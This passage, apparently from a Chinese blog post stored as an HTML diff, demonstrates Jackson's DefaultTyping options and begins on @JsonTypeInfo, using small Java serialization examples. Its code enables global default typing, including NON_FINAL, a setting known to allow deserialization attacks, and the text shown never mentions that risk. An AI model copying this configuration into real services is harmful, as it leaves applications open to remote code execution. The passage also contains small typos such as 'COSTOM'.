class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当不设置OBJECT_AND_NON_CONCRETE属性是运行报错</p>
+<p>设置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@29ee9faa</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看出运行结果跟不开起属性没有啥区别</p>
+<h4 id="3-2-3-NON-CONCRETE-AND-ARRAYS"><a href="#3-2-3-NON-CONCRETE-AND-ARRAYS" class="headerlink" title="3.2.3 NON_CONCRETE_AND_ARRAYS"></a>3.2.3 NON_CONCRETE_AND_ARRAYS</h4><p>支持上文全部类型的Array类型。</p>
+<p>我们定义一个对象数组。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[&#123;&quot;length&quot;:100&#125;,&#123;&quot;length&quot;:100&#125;]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对数组进行反序列化了</p>
+<h4 id="3-2-4-NON-FINAL"><a href="#3-2-4-NON-FINAL" class="headerlink" title="3.2.4 NON_FINAL"></a>3.2.4 NON_FINAL</h4><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//[&quot;jackson.Student&quot;,&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;],[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;]]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-5-总结"><a href="#3-2-5-总结" class="headerlink" title="3.2.5 总结"></a>3.2.5 总结</h4><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p>
+<table>
+<thead>
+<tr>
+<th align="left">DefaultTyping类型</th>
+<th align="left">描述说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">JAVA_LANG_OBJECT</td>
+<td align="left">属性的类型为Object</td>
+</tr>
+<tr>
+<td align="left">OBJECT_AND_NON_CONCRETE</td>
+<td align="left">属性的类型为Object、Interface、AbstractClass</td>
+</tr>
+<tr>
+<td align="left">NON_CONCRETE_AND_ARRAYS</td>
+<td align="left">属性的类型为Object、Interface、AbstractClass、Array</td>
+</tr>
+<tr>
+<td align="left">NON_FINAL</td>
+<td align="left">所有除了声明为final之外的属性</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-JsonTypeInfo注解"><a href="#3-2-JsonTypeInfo注解" class="headerlink" title="3.2 @JsonTypeInfo注解"></a>3.2 @JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-2-1-JsonTypeInfo-Id-NONE"><a href="#3-2-1-JsonTypeInfo-Id-NONE" class="headerlink" title="3.2.1 JsonTypeInfo.Id.NONE"></a>3.2.1 JsonTypeInfo.Id.NONE</h4><p>设置@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)注解和不设置注解是一样的</p>
+<p>不设置注解</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>设置注解</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, 